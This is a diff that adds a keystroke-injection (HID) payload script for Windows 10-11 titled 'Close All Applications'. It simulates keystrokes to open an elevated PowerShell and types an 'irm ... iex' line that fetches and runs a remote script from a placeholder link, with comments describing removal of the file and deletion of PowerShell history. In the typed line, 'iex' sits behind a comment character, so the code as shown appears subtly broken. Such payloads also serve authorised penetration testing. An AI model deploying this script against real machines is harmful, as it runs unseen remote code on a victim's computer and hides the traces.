@@ -1,0 +1,43 @@
+#####################################################
+#                                                   #
+# Title        : Close All Applications             #
+# Author       : Aleff                              #
+# Version      : 1.0                                #
+# Category     : Execution                          #
+# Target       : Windows 10-11                      #
+#                                                   #
+#####################################################
+
+ATTACKMODE HID
+
+# 1. Open a powershell
+# 2. Download a Python script
+# 3. Execute it
+# 4. Remove Python script downloaded
+# 5. Delete powershell history
+
+# VARIABLES
+# - Reply with your own link. The Payload should be close_all_app.ps1
+POWERSHEL_CODE='example.com'
+
+QUACK DELAY 1500
+QUACK GUI x
+QUACK DELAY 250
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK ENTER
+QUACK DELAY 1000
+QUACK TAB
+QUACK TAB
+QUACK ENTER
+QUACK DELAY 2000
+QUACK STRING irm $POWERSHEL_CODE # iex
+QUACK ENTER
